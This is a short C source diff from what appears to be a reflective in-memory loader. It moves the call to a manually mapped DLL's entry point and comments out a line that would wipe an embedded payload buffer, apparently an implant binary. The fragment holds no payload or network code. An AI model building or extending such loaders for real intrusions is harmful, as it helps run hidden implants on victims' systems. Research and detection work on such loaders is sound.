@@ -126,11 +126,15 @@ int main()
             printf("Failed to change memory protection: %d\n", GetLastError());
             return -1;
         }
-
-        BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
-        KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, NULL );
+        
     }
+    
+    
+    BOOL ( WINAPI *KaynDllMain ) ( PVOID, DWORD, PVOID ) = C_PTR( KVirtualMemory + ntHeaders->OptionalHeader.AddressOfEntryPoint - KHdrSize );
+    
+    // memset(demon_x64_bin, 0, demon_x64_bin_len);
 
+    KaynDllMain( KVirtualMemory, DLL_PROCESS_ATTACH, NULL );
 
     return 0;
 }
